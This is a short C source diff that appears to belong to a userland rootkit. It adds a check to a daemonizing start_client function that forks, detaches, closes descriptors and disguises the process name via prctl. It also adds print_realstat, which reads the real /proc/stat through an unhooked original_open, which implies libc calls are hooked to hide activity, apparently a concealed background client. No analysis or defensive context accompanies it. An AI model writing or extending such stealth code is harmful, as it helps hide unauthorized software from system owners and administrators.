@@ -144,6 +144,12 @@ bool start_client(void)
     if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1) return false;
     close(fd);
 
+    if (client_running())
+    {
+        remove(lock_name);
+        return false;
+    }
+
     if (!fork())
     {
         setsid();
@@ -158,7 +164,7 @@ bool start_client(void)
             {
                 close(x);
             }
-            prctl(PR_SET_NAME, PREFIX); // not sure if this works ( IT DOESNT )
+            prctl(PR_SET_NAME, PREFIX); // not sure if this works ( IT DOESNT ) (or does it?)
             remove(lock_name);
 
             client_loop();
@@ -170,4 +176,17 @@ bool start_client(void)
     }
 
     return true;
+}
+
+void print_realstat(void)
+{
+    ORIG(open);
+    int f = original_open("/proc/stat", O_RDONLY);
+    char buf[8192];
+    int n;
+    while ((n = read(f, buf, sizeof(buf))) > 0)
+    {
+        if (write(1, buf, n) != n) break;
+    }
+    close(f);
 }
